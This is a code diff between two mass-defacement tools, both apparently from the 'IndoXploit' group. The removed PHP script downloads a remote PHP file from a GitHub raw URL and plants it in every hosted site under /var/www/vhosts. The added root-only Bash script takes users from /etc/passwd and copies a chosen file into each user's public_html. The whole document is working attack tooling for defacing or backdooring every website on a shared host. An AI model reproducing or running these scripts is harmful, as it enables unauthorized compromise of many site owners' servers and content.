@@ -1,23 +1,36 @@
-<?php
-error_reporting(0);
+#!/bin/bash
+args=("$@")
+UHOME="/var/www/vhosts"
+FILE=$(pwd)"/"${args[0]}
+priv=$([ $(id -u) == 0 ] && echo " here we go..........." || echo " you must root to run this file :)")
 
-$root = '/var/www/vhosts';
-$scan = scandir($root);
+echo " ~~~~~     Mass Deface (root)    ~~~~~ "
+echo " ~~      Coded by: l0c4lh34rtz      ~~ "
+echo " ~    IndoXploit - Sanjungan Jiwa    ~ "
+echo "------ [ usage: ./mass file ] ------"
+echo ""
+echo $priv
+echo ""
 
-$nama = 'kntl.php'; // ganti nama file
-$isi = file_get_contents('https://raw.githubusercontent.com/Sniperxxx/sniper404/main/Billy.php'); // ganti link pastebin scriptmu
+if [ -z "$1" ]
+	then
+	echo "usage: ./mass file"
 
-$bikin = fopen($nama, "w");
-		 fwrite($bikin, $isi);
-		 fclose($bikin);
+else
 
-foreach ( $scan as $a ) {
-	$dir = "$a \n";
-	$gas = $root.'/'.$a.'/web/'.$nama;
-	$cos = "$gas \n";
-	$asu = @copy($nama, $gas);
-	if($asu) {
-		print 'Done! => '.$cos; }
-			else { print 'Failed! => '.$dir; }
-	}
-?>
+ # get list of all users
+_USERS="$(awk -F':' '{ if ( $3 >= 500 ) print $1 }' /etc/passwd)"
+for u in $_USERS
+do 
+   	_dir="${UHOME}/${u}/public_html"
+   	if [ -d "$_dir" ] && [ $(id -u) == 0 ]
+   	then
+       	/bin/cp "$FILE" "$_dir"
+       	if [ -e "$_dir/"$(basename "$FILE") ]
+       		then
+       		echo "[+] sukses ->" "$_dir/"$(basename "$FILE")
+       		#chown $(id -un $u):$(id -gn $u) "$_dir/"$(basename "$FILE")
+       	fi
+   	fi
+done
+fi
